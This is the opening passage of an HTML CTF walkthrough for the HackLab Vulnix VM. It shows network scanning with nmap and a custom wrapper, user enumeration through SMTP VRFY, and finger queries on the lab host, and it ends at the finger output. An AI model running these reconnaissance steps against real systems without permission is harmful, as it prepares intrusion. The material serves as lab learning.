@@ -1,0 +1,2089 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="description" content="">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+
+<!-- Title -->
+<title>Gandosha - Autodidacticism.</title>
+
+<!-- Core Stylesheet -->
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+<!-- Preloader -->
+<div id="preloader">
+<div class="loader"></div>
+</div>
+
+<div class="vcard-main-wrapper">
+<div class="vcard-content-wrapper bg-img" style="background-image: url(img/bg-img/bgssss.jpg);">
+<!-- Header Area -->
+<header class="header_area">
+<!-- Logo -->
+<div class="logo d-flex justify-content-center align-items-center">
+<a href="index-horizontal-about.html"><img src="img/core-img/logo3.png" alt=""></a>
+<!-- Navbar Toggle -->
+<div class="nav-toggle">
+<i class="fa fa-bars"></i>
+</div>
+</div>
+
+<!-- Menu -->
+<ul class="vcard-nav">
+<li><a href="https://github.com/Gandosha" data-toggle="tooltip" data-placement="top" title="Github"><i class="fa fa-fw fa-github" aria-hidden="true"></i></a></li>
+<li><a href="index.html">About</a></li>
+<li class="active"><a href="walkthroughs.html">CTF Walkthroughs</a></li>
+<li><a href="cheatsheets.html">Cheat Sheets</a></li>
+</ul>
+</header>
+
+<!-- Vcard Page Content -->
+<div class="vcard-page-content-wrapper d-flex align-items-end">
+<div class="page-content">
+
+<!-- ##### VM Title and link ##### -->
+<div class="about-me-area section-padding-100 clearfix">
+<div class="container-fluid">
+<div class="row align-items-end">
+<div class="about-me-text">
+<hr>
+<p><h2>HackLab: Vulnix</h2>
+<h7>VM: https://www.vulnhub.com/entry/hacklab-vulnix,48/</h7></p>
+<hr>
+<br>
+<br>
+<br>
+<br>
+<p><h3>Information Gathering:</h3></p>
+<hr>
+<p><font size="3.5" color="black">First, I fired up HaGashash in order to gain some information about which host to attack and what interesting ports are there. (https://github.com/Gandosha/HaGashash).</font></p>
+<pre style="background-color:black;color:white;">
+[GandoPC ~]# go run go/src/github.com/Gandosha/HaGashash/main.go -interface=enp0s3 -project=HackLab:_Vulnix -subnet=true
+
+
+
+<-=|HaGashash by Gandosha|=->
+
+[+] nmap executable is in '/usr/bin/nmap'
+[+] ifconfig executable is in '/usr/bin/ifconfig'
+[!] Dependencies check is completed successfully.
+
+
+[!] Starting to scan your subnet.
+
+ 
+[+] Alive hosts in 192.168.43.0/24 are:
+
+192.168.43.1
+
+192.168.43.2
+
+192.168.43.3
+
+192.168.43.4
+
+
+[+] Directory created at: /HaGashash_Projects/HackLab:_Vulnix/192.168.43.1.
+
+
+[!] Starting to scan 192.168.43.1 for TCP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.1 for UDP interesting stuff.
+
+
+[+] Directory created at: /HaGashash_Projects/HackLab:_Vulnix/192.168.43.2.
+
+
+[!] Starting to scan 192.168.43.2 for TCP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.2 for UDP interesting stuff.
+
+
+[+] Directory created at: /HaGashash_Projects/HackLab:_Vulnix/192.168.43.3.
+
+
+[!] Starting to scan 192.168.43.3 for TCP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.3 for UDP interesting stuff.
+
+
+[+] Directory created at: /HaGashash_Projects/HackLab:_Vulnix/192.168.43.4.
+
+
+[!] Starting to scan 192.168.43.4 for UDP interesting stuff.
+
+
+
+[!] Starting to scan 192.168.43.4 for TCP interesting stuff.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.4 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.4 is completed successfully.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.3 is completed successfully.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.1 is completed successfully.
+
+
+
+[+] Nmap's TCP script scanning on 192.168.43.2 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.3 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.2 is completed successfully.
+
+
+
+[+] Nmap's UDP script scanning on 192.168.43.1 is completed successfully.
+
+
+
+[+] Summary file for 192.168.43.4 is ready.
+
+
+
+[+] Summary file for 192.168.43.3 is ready.
+
+
+
+[+] Summary file for 192.168.43.2 is ready.
+
+
+
+[+] Summary file for 192.168.43.1 is ready.
+
+[gandosha@GandoPC 192.168.43.4]$ cat nmap_TCP_scan_output 
+# Nmap 7.70 scan initiated Tue Oct 16 13:53:29 2018 as: nmap -sS -p- -A -T4 -Pn -vv -oN /HaGashash_Projects/HackLab:_Vulnix/192.168.43.4/nmap_TCP_scan_output 192.168.43.4
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.43.4
+Host is up, received arp-response (0.0028s latency).
+Scanned at 2018-10-16 13:53:31 IDT for 35s
+Not shown: 65518 closed ports
+Reason: 65518 resets
+PORT      STATE SERVICE  REASON         VERSION
+22/tcp    open  ssh      syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBAJJHCFDFkbuQTVpmQvCvdR2poQrsZOQ0nBEsUij15T9DAiUhxI41G8hQ97MM9Qe0eGdP7HsA8vkZnglainhktvPe1NN9+XnDVRziI3dEqSxpCi4obxxYdKtqGBIj83dOPpxm09xDhVYBdh7ZlZh8xttD+ACFqmN4VZjmv0IlSYZFAAAAFQC6Z+j+KbT59gBXSPQTpAJIh0FE2wAAAIEAgYwA5oFVMQdKfRwAxbLoADx3t735BpLIoVNX2j4UrAF8CmwLCmcsNAhdpUP+hMhKGXnP5co2nira3OkcwWRu219bjte7m1l9JOvCJUASTUzOC0CUJkm9wO40/gyJOelKRR37r0qnBImiEumL6dSpcg4b0IfozCI9UJGh/yiEu4kAAACASWk2tKCyCHamiXwIt0XdwTXubZYtRtH09LHdisSEsoinz+2szuzbqnwgancHXcyQ3PapixZhVNASZ8MobmkFDXh4SDS5zl+RW7K40FBh3z+HCdSAJJjkRFXWEuadjxpO2QWBYEJiER4AtFWUSl2kVMFdsWqYaK7BxStNNkmGBII=
+|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1jCDgzdowLQVOEXrczN+xbuMcNkncz2EfCEncP7k8rhNjQq+eXzMKEfULxMLh/wLFhX2TVZDECTpQ0WVJckgkGeZSdvmEJKt5LbZlSm5HAz/DMUKIuohDRI4F3lqn9u5VAVKSyTXyR3EuxCsCHJy+Xf40BJImr+fZ7yH3xwPPqJ9in+LfgTXaRItqLDHiHAsTIXXwsDgweaS9hSTAR1MO+TdZCnXKPJ1NEt38+Fl7rnTnBE2TdtU3iyrlWXE0GGGg0bgldqas7bR4UH/uRZZOZK2+UTf0qg30H7ll8ShfZIbdW+59RfQqYz8tZYsoWoxahWf3dmx5soCWWcAP7DAV
+|   256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
+|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGEudclsh1beHM/DPWQGR31dOGqdLcXVj1xLG/YSGfiNmN1pT6x0MwYQyN6pzCzzonljThH8JwIZjid+JN2PzxE=
+25/tcp    open  smtp     syn-ack ttl 64 Postfix smtpd
+|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| ssl-cert: Subject: commonName=vulnix
+| Issuer: commonName=vulnix
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2012-09-02T17:40:12
+| Not valid after:  2022-08-31T17:40:12
+| MD5:   58e3 f1ac fef6 b6d1 744c 836f ba24 4f0a
+| SHA-1: 712f 69ba 8c54 32e5 711c 898b 55ab 0a83 44a0 420b
+| -----BEGIN CERTIFICATE-----
+| MIICnjCCAYYCCQCrWhznjAI2hTANBgkqhkiG9w0BAQUFADARMQ8wDQYDVQQDEwZ2
+| dWxuaXgwHhcNMTIwOTAyMTc0MDEyWhcNMjIwODMxMTc0MDEyWjARMQ8wDQYDVQQD
+| EwZ2dWxuaXgwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDDbiWM7/Xk
+| 7+VnQuSzKIy6GgD9xAw5jCnKmRY6MfJ0jNmpIjo70LEpoTTEZvFLwKbdkxQHzusv
+| 50GOrZLm6MkrB2Ad8skvkJR9PA05KoM+Uha5P35rdF0MaNPtHRpA5W3Ql3qAoph7
+| 8hGmdI4GrLmedxkmajniCYNpowArI7UjYA5FWF6q1m41CS+xCqk9u4qH8SrV616z
+| bJ2H00mhp0NJDJbTDX35biGeGKR70e5xQAkMwQKM6s9iLBo2nrH2JKyxfVMeMgQf
+| KoRJEeILZbgP4X9Xc6iA9GuNSqluObOhCv1RsFLP915xNvnf6aZf8EtyODISzXhj
+| GBsy//uolXMLAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBAIJHgnARP3nuoFigE9vE
+| CyK9sKYPn+nh0xOMFil2LzfcZsVRqTl0T/VbOug1i+pettkcPqWBBNs1Q5uSEIuP
+| 0pEq9AQdeLk7weMa0trDK+XoSbEvcAvYPnbK6Ghr343FE74nmxewtfCbrNfEnYZB
+| TYlEElBqcQFSo4kB6UyMOOGwuIJ7EHITPa7ZxKW6OBOVOzCUiYm3hGn7dpyVeaH/
+| zpSwobV1pSqyW7+Tb3KO82lqSnmYvRzk3TmIVXutOXTVE+L58xbo5uafae2UvP4m
+| m5Be1rZi17Ub1kIMKT+OJLq2oaDb6Y8Ni/a267RoGO/TcwCLjKHsDl5Niwk6rYMX
+| ZtY=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2018-10-16T10:53:56+00:00; -1s from scanner time.
+79/tcp    open  finger   syn-ack ttl 64 Linux fingerd
+|_finger: No one logged on.\x0D
+110/tcp   open  pop3     syn-ack ttl 64 Dovecot pop3d
+|_pop3-capabilities: PIPELINING SASL RESP-CODES CAPA UIDL TOP STLS
+| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server/emailAddress=root@vulnix/organizationalUnitName=vulnix
+| Issuer: commonName=vulnix/organizationName=Dovecot mail server/emailAddress=root@vulnix/organizationalUnitName=vulnix
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2012-09-02T17:40:22
+| Not valid after:  2022-09-02T17:40:22
+| MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
+| SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
+| -----BEGIN CERTIFICATE-----
+| MIIDizCCAnOgAwIBAgIJAKvS691t83I+MA0GCSqGSIb3DQEBBQUAMFwxHDAaBgNV
+| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxDzANBgNVBAsMBnZ1bG5peDEPMA0GA1UE
+| AwwGdnVsbml4MRowGAYJKoZIhvcNAQkBFgtyb290QHZ1bG5peDAeFw0xMjA5MDIx
+| NzQwMjJaFw0yMjA5MDIxNzQwMjJaMFwxHDAaBgNVBAoME0RvdmVjb3QgbWFpbCBz
+| ZXJ2ZXIxDzANBgNVBAsMBnZ1bG5peDEPMA0GA1UEAwwGdnVsbml4MRowGAYJKoZI
+| hvcNAQkBFgtyb290QHZ1bG5peDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
+| ggEBALv7qqgwWV56bHtf/0PqD6yMN1bv866H5gqrVENXrfaL8ZOiNCD9/Fg6jOuh
+| VLV5iw5y8lKNdMZW5PWHN8mQEeoyWWFXMV1X4RLvOuTIf1sXNHp+IcwZpDDobHzQ
+| ENhpwhlWTxdObUEVVT/ChOTaAQIpi9AFzo4fjJ4UEHfEae98cssmuqQP9Unj9xKv
+| vCj181l3g9VAQ92KjxWeWMa8e+ecwBVtAsPdU3ZwmwVIuVnBDa9nRdkR0y31RWSr
+| /Lil4ckL0TZ4K92z146pTex7QSNKGHyuLPJGddm5pu11WP5cJEz9O2MDOo6WEISb
+| V7EEpfbvrA6cd+ISf4dGSyNZfp8CAwEAAaNQME4wHQYDVR0OBBYEFACM4N/xHviz
+| b3W/Qea+BvYb3O7AMB8GA1UdIwQYMBaAFACM4N/xHvizb3W/Qea+BvYb3O7AMAwG
+| A1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAEP1Kk3MagUfM6kOLgK++4gV
+| LJzOC1OGQ/ERyNRhk8JgVbhuasrC7hNtzk2ku7yP4H8IlVzjs4EGQOxoGKHnrzBr
+| 76iqlQRASZbJPwemc1CpRbh7XTZAOPHUbihycpG4iQZD2/55c6Az+TcyHLqjPbCW
+| YVCAB8mMXDtYEB4OiOEvbulud5fjXAu7ba8tzUSqAWF7dA9S/vcmmnCC+y1nV9Tc
+| 8K1+edk6WTOjoQEALUA5ikfB8I8O95AWPkfcj77BOiPOvPlEGlaWm85DMRkVOatg
+| mqDiJCaX/SajIW22LgEw81ErtM8m6RAZ1qN+sf9O6T7+Mxvbd6aPx/bxj/LwQ6c=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2018-10-16T10:53:57+00:00; 0s from scanner time.
+111/tcp   open  rpcbind  syn-ack ttl 64 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      41645/tcp  mountd
+|   100005  1,2,3      47493/udp  mountd
+|   100021  1,3,4      50218/udp  nlockmgr
+|   100021  1,3,4      60141/tcp  nlockmgr
+|   100024  1          51815/udp  status
+|   100024  1          60680/tcp  status
+|   100227  2,3         2049/tcp  nfs_acl
+|_  100227  2,3         2049/udp  nfs_acl
+143/tcp   open  imap     syn-ack ttl 64 Dovecot imapd
+|_imap-capabilities: more have OK listed capabilities LITERAL+ Pre-login LOGIN-REFERRALS post-login ENABLE SASL-IR ID IMAP4rev1 IDLE STARTTLS LOGINDISABLEDA0001
+| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server/emailAddress=root@vulnix/organizationalUnitName=vulnix
+| Issuer: commonName=vulnix/organizationName=Dovecot mail server/emailAddress=root@vulnix/organizationalUnitName=vulnix
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2012-09-02T17:40:22
+| Not valid after:  2022-09-02T17:40:22
+| MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
+| SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
+| -----BEGIN CERTIFICATE-----
+| MIIDizCCAnOgAwIBAgIJAKvS691t83I+MA0GCSqGSIb3DQEBBQUAMFwxHDAaBgNV
+| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxDzANBgNVBAsMBnZ1bG5peDEPMA0GA1UE
+| AwwGdnVsbml4MRowGAYJKoZIhvcNAQkBFgtyb290QHZ1bG5peDAeFw0xMjA5MDIx
+| NzQwMjJaFw0yMjA5MDIxNzQwMjJaMFwxHDAaBgNVBAoME0RvdmVjb3QgbWFpbCBz
+| ZXJ2ZXIxDzANBgNVBAsMBnZ1bG5peDEPMA0GA1UEAwwGdnVsbml4MRowGAYJKoZI
+| hvcNAQkBFgtyb290QHZ1bG5peDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
+| ggEBALv7qqgwWV56bHtf/0PqD6yMN1bv866H5gqrVENXrfaL8ZOiNCD9/Fg6jOuh
+| VLV5iw5y8lKNdMZW5PWHN8mQEeoyWWFXMV1X4RLvOuTIf1sXNHp+IcwZpDDobHzQ
+| ENhpwhlWTxdObUEVVT/ChOTaAQIpi9AFzo4fjJ4UEHfEae98cssmuqQP9Unj9xKv
+| vCj181l3g9VAQ92KjxWeWMa8e+ecwBVtAsPdU3ZwmwVIuVnBDa9nRdkR0y31RWSr
+| /Lil4ckL0TZ4K92z146pTex7QSNKGHyuLPJGddm5pu11WP5cJEz9O2MDOo6WEISb
+| V7EEpfbvrA6cd+ISf4dGSyNZfp8CAwEAAaNQME4wHQYDVR0OBBYEFACM4N/xHviz
+| b3W/Qea+BvYb3O7AMB8GA1UdIwQYMBaAFACM4N/xHvizb3W/Qea+BvYb3O7AMAwG
+| A1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAEP1Kk3MagUfM6kOLgK++4gV
+| LJzOC1OGQ/ERyNRhk8JgVbhuasrC7hNtzk2ku7yP4H8IlVzjs4EGQOxoGKHnrzBr
+| 76iqlQRASZbJPwemc1CpRbh7XTZAOPHUbihycpG4iQZD2/55c6Az+TcyHLqjPbCW
+| YVCAB8mMXDtYEB4OiOEvbulud5fjXAu7ba8tzUSqAWF7dA9S/vcmmnCC+y1nV9Tc
+| 8K1+edk6WTOjoQEALUA5ikfB8I8O95AWPkfcj77BOiPOvPlEGlaWm85DMRkVOatg
+| mqDiJCaX/SajIW22LgEw81ErtM8m6RAZ1qN+sf9O6T7+Mxvbd6aPx/bxj/LwQ6c=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2018-10-16T10:53:57+00:00; -1s from scanner time.
+512/tcp   open  exec     syn-ack ttl 64 netkit-rsh rexecd
+513/tcp   open  login    syn-ack ttl 64
+514/tcp   open  shell    syn-ack ttl 64 Netkit rshd
+993/tcp   open  ssl/imap syn-ack ttl 64 Dovecot imapd
+|_imap-capabilities: more have Pre-login listed LITERAL+ capabilities LOGIN-REFERRALS post-login ENABLE SASL-IR OK IMAP4rev1 IDLE AUTH=PLAINA0001 ID
+| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server/emailAddress=root@vulnix/organizationalUnitName=vulnix
+| Issuer: commonName=vulnix/organizationName=Dovecot mail server/emailAddress=root@vulnix/organizationalUnitName=vulnix
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2012-09-02T17:40:22
+| Not valid after:  2022-09-02T17:40:22
+| MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
+| SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
+| -----BEGIN CERTIFICATE-----
+| MIIDizCCAnOgAwIBAgIJAKvS691t83I+MA0GCSqGSIb3DQEBBQUAMFwxHDAaBgNV
+| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxDzANBgNVBAsMBnZ1bG5peDEPMA0GA1UE
+| AwwGdnVsbml4MRowGAYJKoZIhvcNAQkBFgtyb290QHZ1bG5peDAeFw0xMjA5MDIx
+| NzQwMjJaFw0yMjA5MDIxNzQwMjJaMFwxHDAaBgNVBAoME0RvdmVjb3QgbWFpbCBz
+| ZXJ2ZXIxDzANBgNVBAsMBnZ1bG5peDEPMA0GA1UEAwwGdnVsbml4MRowGAYJKoZI
+| hvcNAQkBFgtyb290QHZ1bG5peDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
+| ggEBALv7qqgwWV56bHtf/0PqD6yMN1bv866H5gqrVENXrfaL8ZOiNCD9/Fg6jOuh
+| VLV5iw5y8lKNdMZW5PWHN8mQEeoyWWFXMV1X4RLvOuTIf1sXNHp+IcwZpDDobHzQ
+| ENhpwhlWTxdObUEVVT/ChOTaAQIpi9AFzo4fjJ4UEHfEae98cssmuqQP9Unj9xKv
+| vCj181l3g9VAQ92KjxWeWMa8e+ecwBVtAsPdU3ZwmwVIuVnBDa9nRdkR0y31RWSr
+| /Lil4ckL0TZ4K92z146pTex7QSNKGHyuLPJGddm5pu11WP5cJEz9O2MDOo6WEISb
+| V7EEpfbvrA6cd+ISf4dGSyNZfp8CAwEAAaNQME4wHQYDVR0OBBYEFACM4N/xHviz
+| b3W/Qea+BvYb3O7AMB8GA1UdIwQYMBaAFACM4N/xHvizb3W/Qea+BvYb3O7AMAwG
+| A1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAEP1Kk3MagUfM6kOLgK++4gV
+| LJzOC1OGQ/ERyNRhk8JgVbhuasrC7hNtzk2ku7yP4H8IlVzjs4EGQOxoGKHnrzBr
+| 76iqlQRASZbJPwemc1CpRbh7XTZAOPHUbihycpG4iQZD2/55c6Az+TcyHLqjPbCW
+| YVCAB8mMXDtYEB4OiOEvbulud5fjXAu7ba8tzUSqAWF7dA9S/vcmmnCC+y1nV9Tc
+| 8K1+edk6WTOjoQEALUA5ikfB8I8O95AWPkfcj77BOiPOvPlEGlaWm85DMRkVOatg
+| mqDiJCaX/SajIW22LgEw81ErtM8m6RAZ1qN+sf9O6T7+Mxvbd6aPx/bxj/LwQ6c=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2018-10-16T10:53:56+00:00; 0s from scanner time.
+995/tcp   open  ssl/pop3 syn-ack ttl 64 Dovecot pop3d
+|_pop3-capabilities: PIPELINING SASL(PLAIN) RESP-CODES CAPA UIDL USER TOP
+| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server/emailAddress=root@vulnix/organizationalUnitName=vulnix
+| Issuer: commonName=vulnix/organizationName=Dovecot mail server/emailAddress=root@vulnix/organizationalUnitName=vulnix
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2012-09-02T17:40:22
+| Not valid after:  2022-09-02T17:40:22
+| MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
+| SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
+| -----BEGIN CERTIFICATE-----
+| MIIDizCCAnOgAwIBAgIJAKvS691t83I+MA0GCSqGSIb3DQEBBQUAMFwxHDAaBgNV
+| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxDzANBgNVBAsMBnZ1bG5peDEPMA0GA1UE
+| AwwGdnVsbml4MRowGAYJKoZIhvcNAQkBFgtyb290QHZ1bG5peDAeFw0xMjA5MDIx
+| NzQwMjJaFw0yMjA5MDIxNzQwMjJaMFwxHDAaBgNVBAoME0RvdmVjb3QgbWFpbCBz
+| ZXJ2ZXIxDzANBgNVBAsMBnZ1bG5peDEPMA0GA1UEAwwGdnVsbml4MRowGAYJKoZI
+| hvcNAQkBFgtyb290QHZ1bG5peDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
+| ggEBALv7qqgwWV56bHtf/0PqD6yMN1bv866H5gqrVENXrfaL8ZOiNCD9/Fg6jOuh
+| VLV5iw5y8lKNdMZW5PWHN8mQEeoyWWFXMV1X4RLvOuTIf1sXNHp+IcwZpDDobHzQ
+| ENhpwhlWTxdObUEVVT/ChOTaAQIpi9AFzo4fjJ4UEHfEae98cssmuqQP9Unj9xKv
+| vCj181l3g9VAQ92KjxWeWMa8e+ecwBVtAsPdU3ZwmwVIuVnBDa9nRdkR0y31RWSr
+| /Lil4ckL0TZ4K92z146pTex7QSNKGHyuLPJGddm5pu11WP5cJEz9O2MDOo6WEISb
+| V7EEpfbvrA6cd+ISf4dGSyNZfp8CAwEAAaNQME4wHQYDVR0OBBYEFACM4N/xHviz
+| b3W/Qea+BvYb3O7AMB8GA1UdIwQYMBaAFACM4N/xHvizb3W/Qea+BvYb3O7AMAwG
+| A1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAEP1Kk3MagUfM6kOLgK++4gV
+| LJzOC1OGQ/ERyNRhk8JgVbhuasrC7hNtzk2ku7yP4H8IlVzjs4EGQOxoGKHnrzBr
+| 76iqlQRASZbJPwemc1CpRbh7XTZAOPHUbihycpG4iQZD2/55c6Az+TcyHLqjPbCW
+| YVCAB8mMXDtYEB4OiOEvbulud5fjXAu7ba8tzUSqAWF7dA9S/vcmmnCC+y1nV9Tc
+| 8K1+edk6WTOjoQEALUA5ikfB8I8O95AWPkfcj77BOiPOvPlEGlaWm85DMRkVOatg
+| mqDiJCaX/SajIW22LgEw81ErtM8m6RAZ1qN+sf9O6T7+Mxvbd6aPx/bxj/LwQ6c=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2018-10-16T10:53:55+00:00; -1s from scanner time.
+2049/tcp  open  nfs_acl  syn-ack ttl 64 2-3 (RPC #100227)
+36654/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
+41645/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
+43602/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
+60141/tcp open  nlockmgr syn-ack ttl 64 1-4 (RPC #100021)
+60680/tcp open  status   syn-ack ttl 64 1 (RPC #100024)
+MAC Address: 08:00:27:AF:E3:88 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=10/16%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=5B
+OS:C5C34E%P=x86_64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=
+OS:I%TS=8)OPS(O1=M5B4ST11NW3%O2=M5B4ST11NW3%O3=M5B4NNT11NW3%O4=M5B4ST11NW3%
+OS:O5=M5B4ST11NW3%O6=M5B4ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W
+OS:6=3890)ECN(R=Y%DF=Y%TG=40%W=3908%O=M5B4NNSNW3%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%
+OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=
+OS:%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=4
+OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
+OS:%Q=)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)
+
+Uptime guess: 198.047 days (since Sun Apr  1 12:45:48 2018)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 0s, deviation: 0s, median: -1s
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   2.80 ms 192.168.43.4
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Oct 16 13:54:06 2018 -- 1 IP address (1 host up) scanned in 38.08 seconds
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Port 25 check:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Port 25 is open and it can expose information about users of the system using VRFY command.</font></p>
+<p><font size="3.5" color="black">I ran smtp-user-enum using VRFY method in order to verify what users exist.</font></p> 
+<pre style="background-color:black;color:white;">
+[GandoPC 192.168.43.4]# smtp-user-enum -M VRFY -U /home/gandosha/Desktop/SecLists/wordlists/unix_users.txt -t 192.168.43.4 > usernames_exist
+[GandoPC 192.168.43.4]# cat usernames_exist 
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... VRFY
+Worker Processes ......... 5
+Usernames file ........... /home/gandosha/Desktop/SecLists/wordlists/unix_users.txt
+Target count ............. 1
+Username count ........... 112
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ 
+
+######## Scan started at Tue Oct 16 14:24:25 2018 #########
+192.168.43.4: ROOT exists
+192.168.43.4: backup exists
+192.168.43.4: bin exists
+192.168.43.4: daemon exists
+192.168.43.4: games exists
+192.168.43.4: gnats exists
+192.168.43.4: irc exists
+192.168.43.4: list exists
+192.168.43.4: libuuid exists
+192.168.43.4: lp exists
+192.168.43.4: mail exists
+192.168.43.4: man exists
+192.168.43.4: messagebus exists
+192.168.43.4: news exists
+192.168.43.4: nobody exists
+192.168.43.4: postmaster exists
+192.168.43.4: proxy exists
+192.168.43.4: root exists
+192.168.43.4: sshd exists
+192.168.43.4: sync exists
+192.168.43.4: sys exists
+192.168.43.4: syslog exists
+192.168.43.4: user exists
+192.168.43.4: uucp exists
+192.168.43.4: www-data exists
+######## Scan completed at Tue Oct 16 14:24:26 2018 #########
+25 results.
+
+112 queries in 1 seconds (112.0 queries / sec)
+</pre>
+<hr>
+<br>
+<br>
+<p><h3>Port 79 check:</h3></p>
+<hr>
+<p><font size="3.5" color="black">Finger is a program you can use to find information about computer users.</font></p>
+<p><font size="3.5" color="black">I had to install netkit-bsd-finger (in arch using yaourt) and check all those users:</font></p>
+<pre style="background-color:black;color:white;">
+[gandosha@GandoPC 192.168.43.4]$ finger -l root@192.168.43.4
+[192.168.43.4]
+Login: root           			Name: root
+Directory: /root                    	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
